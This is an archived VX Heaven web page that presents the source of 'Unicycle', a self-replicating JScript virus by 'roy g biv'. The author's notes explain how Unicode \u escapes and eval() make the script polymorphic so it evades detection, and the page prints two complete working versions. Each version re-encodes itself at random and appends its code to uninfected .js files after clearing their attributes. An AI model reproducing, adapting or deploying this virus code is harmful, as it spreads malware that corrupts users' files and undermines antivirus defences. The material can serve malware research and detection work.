<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Unicycle - Virus for - by roy g biv (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"d74dbd07ab6478f3561e5ffa573a69c3772ae84d-1498755350-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/><script type="text/rocketscript">	var s = 0;
	function soundex() {
		if (document.getElementById) {
			var snd = document.getElementById("snd");
			var frm = document.getElementById("sfrm");
			s = 1 - s;
			snd.src = "/img/sound_" + (s ? "on" : "off") + ".gif";
			frm.soundex.value = s;
		}
	}
	function do_img() {
		if (document.getElementById)
			document.write('<' + 'img id="snd" class="va" src="/img/sound_' + (s ? 'on' : 'off') + '.gif" onclick="soundex();" alt="" /' + '>');
	}</script>
<link rel="stylesheet" type="text/css" href="/style.css"/><style type="text/css">.va{vertical-align:middle;}</style>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/src.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Source code of computer viruses</h1><h2>Unicycle - Virus for - by roy g biv</h2><p><em>Virus for -</em></p><p><strong>roy g biv</strong><br/><small><a href="/src.php?author=roy g biv">Show all viruses by this author</a></small></p><p>2007-04-01</p><a href="#disqus_thread">Comments</a><br/><form class="fr" method="post" action="/file.php"><input type="image" src="/img/dl.gif" alt="Download"/><input type="hidden" name="file" value="c3JjL3VuaWN5Y2xlLnppcA@@"/></form> Download unicycle.zip (8103 bytes) or <a href="/src_view.php?file=unicycle.zip">browse online</a>UNICYCLE .A and .B
<p><strong>Author's notes</strong></p>
<blockquote>
<h2>What are Unicode escapes?</h2>
<p>Some special characters cannot travel through ASCII gateways properly, so the solution is to encode them using a special ASCII encoding. This is usually required by web sites, and is marked by the "%" character. A more specific kind of encoding is for characters whose value is larger than 255, which is for non-ISO-8859 characters, such as Arabic and Hebrew characters. It is marked by the "\u" sequence. There is a more detailed description of Unicode in my United Nations article, which was part of the EfishNC release, but it is not important right now.</p>
<p>The point is that currently the most common use of "\u" encoding is to deliver executable code for exploit payloads, and this is how I found out about it. Since I'm a curious person, I wondered if it could be applied to the script code itself. The answer, of course, is yes. :)</p>
<h2>Great! Tell me more!</h2>
<p>The Windows JScript engine converts all scripts to Unicode internally, so we must encode our scripts using Unicode escapes. All escapes must be in little-endian format. So, for example, "test" becomes "\u0074\u0065\u0073\u0074".</p>
<p>When I first tried it, there seemed to be some limitations, though - certain elements cannot be encoded. This includes statements, operators, braces, parentheses, and numbers. That is a lot of exceptions, but it still becomes polymorphic enough no-one will be stupid enough to attempt to detect a virus based on just those. ;) Functions can be encoded, and that became very useful later, but here is the first attempt, must be single line:</p>
<pre class="source">
;/*Unicycle - roy g biv 01/04/07*/
a=new ActiveXObject("scripting.filesystemobject")
b=a.opentextfile(WScript.scriptfullname).readall()
b=b.substr(b.search(c=/;\/\*Unicycle/))         //remove everything before our code
e=b.substr(0,d=b.search(/\*\//)+2)              //skip comment section
Math.random(f=1)                                //let's make it different every time
while(d<b.length)
{
  if(f&&(((g=b.substr(d,4))=="new ")||g=="else"||g=="for("||g=="try{"||((g=b.substr(d,5))=="while"))||g=="catch"||((g=b.substr(d,2))=="if"))e=e+g
                                                //add statements if not between ""
  else
  {
    if(g=="\"+"u")b=b.substr(0,d)+eval("'"+b.substr(d,6)+"'")+b.substr(d+6)
                                                //decode "\u" encoding
    g=b.charAt(d)                               //get character
    f^=g=='"'                                   //remember if "
    e=e+(" !"&'()+,./0124568*;<:=>?{\\^}|".indexOf(g)+1||Math.random()>.5?g:"\"+"u00"+b.charCodeAt(d).toString(16))
                                                //store character if special, else encode it with 50% chance
  }
  d+=g.length
}
for(d=new Enumerator(a.getfolder(".").files);!d.atEnd();d.moveNext())
                                                //demo version, current directory only
{
  if(a.getextensionname(b=d.item()).toLowerCase()=="js")try
  {
    f=b.attributes
    b.attributes=0
    if(a.opentextfile(b).readall().search(c)<0)a.opentextfile(b,8).write(e)
                                                //append ourselves if not infected already
    b.attributes=f
  }
  catch(z)
  {
  }
}
</pre>
<h2>Second Attempt</h2>
<p>I  noticed  that  the characters inside quotes can be encoded  completely,  no matter  if  they are special or not.  This made me think think about  ways  to encode  the  whole script without restriction.  Eventually I worked it  out  - eval().   This  is  also why the ability to encode functions  is  important  -
everything  can  be  encoded,  except  for  the  parentheses  and  the  string
delimiters  of the eval.  There are two special characters that cannot be used
directly.   One  is  the  "", the other is the string  delimiter.   They  are
special  because  if we want to write "\<char>", it should be  interpreted  as
"<char>".   The  problem is that if the "" is encoded as "\u005c",  then  the
behaviour  goes wrong, depending on what "<char>" is.  If it is "", then what
follows  the  second  "" becomes the escaped character.  If it is the  string
delimiter,  then  the  string will end too soon.  The solution is to  use  the
String.fromCharCode() method instead, and then there is no problem.</p>
<p>This result is this code:</p>
<pre class="source">
;/*Unicycle - roy g biv 01/04/07*/
eval('
a=new ActiveXObject("scripting.filesystemobject")
b=a.opentextfile(WScript.scriptfullname).readall()
b=b.substr(b.search(c="Unicycle")-3)            //remove everything before our code
e=b.substr(0,d=b.search("biv")+14)              //skip comment section
f=String.fromCharCode(92)                       //""
g=String.fromCharCode(39)                       //"'"
Math.random(1)                                  //let's make it different every time
while(d<b.length-2)
{
  if((h=b.substr(d,2))==f+"u")b=b.substr(0,d)+eval(g+b.substr(d,6)+g)+b.substr(d+6)
                                                //decode \u encoding
  e=e+(d==38?h:Math.random()>.5?b.charAt(d--):f+"u00"+b.charCodeAt(d--).toString(16))
                                                //encode all but first "('" with 50% chance
  d+=2
}
for(d=new Enumerator(a.getfolder(".").files);!d.atEnd();d.moveNext())
                                                //demo version, current directory only
{
  if(a.getextensionname(b=d.item()).toLowerCase()=="js")try
  {
    f=b.attributes
    b.attributes=0
    if(a.opentextfile(b).readall().search(c)<0)a.opentextfile(b,8).write(e+g+")")
                                                //append ourselves if not infected already
    b.attributes=f
  }
  catch(z)
  {
  }
}
')
</pre>
</blockquote>
<script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/src.php?info=unicycle.zip';</script></div><br /><div class="s2">
    <div id="disqus_thread"></div>
    <script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>



</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"></div>
</body>
</html>
